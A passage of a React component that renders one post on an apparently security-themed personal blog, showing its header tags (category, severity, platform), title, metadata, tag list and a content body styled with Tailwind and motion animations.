  const post = getPost(slug)

  if (!post) return <Navigate to="/blog" replace />

  return (
    <main className="relative z-10 pt-24 pb-24 px-4 sm:px-6">
      <div className="max-w-4xl mx-auto">

        <Link
          to="/blog"
          className="inline-flex items-center gap-1.5 text-gray-500 hover:text-cyber-green font-mono text-xs mb-8 transition-colors"
        >
          <ArrowLeft className="w-3.5 h-3.5" /> cd ../blog
        </Link>

        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card p-5 sm:p-8 mb-8 overflow-hidden relative"
        >
          <div className={clsx('absolute top-0 left-0 right-0 h-0.5 bg-gradient-to-r', post.coverGradient.split(' ')[0], 'to-cyber-blue/60')} />

          <div className="flex flex-wrap gap-2 mb-4">
            <span className="tag tag-purple">{post.category}</span>
            {post.severity && (
              <span className={clsx('tag', SEVERITY_STYLES[post.severity] || 'tag-blue')}>
                {post.severity}
              </span>
            )}
            {post.platform && (
              <span className="tag tag-blue">
                <Bug className="w-2.5 h-2.5 mr-0.5" />{post.platform}
              </span>
            )}
          </div>

          <h1 className="text-2xl lg:text-3xl font-bold text-white mb-4 leading-tight">
            {post.title}
          </h1>
          <p className="text-gray-400 text-sm leading-relaxed mb-5">{post.excerpt}</p>

          <div className="flex flex-wrap items-center gap-4 text-xs font-mono text-gray-600 mb-5">
            <span className="flex items-center gap-1.5"><Calendar className="w-3 h-3" />{post.date}</span>
            <span className="flex items-center gap-1.5"><Clock className="w-3 h-3" />{post.readTime} read</span>
            <span className="flex items-center gap-1.5"><Shield className="w-3 h-3 text-cyber-green" />Yousef Zain Aldeen</span>
          </div>

          <div className="flex flex-wrap gap-1.5">
            {post.tags.map((tag) => (
              <span key={tag} className="px-2 py-0.5 rounded text-xs font-mono bg-cyber-surface text-gray-500 border border-cyber-border/50">
                #{tag.toLowerCase().replace(/\s+/g, '-')}
              </span>
            ))}
          </div>
        </motion.div>

        {/* Body */}
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="glass-card p-4 sm:p-8"
        >
          <PostContent slug={slug} />
        </motion.div>
      </div>
    </main>
  )
}
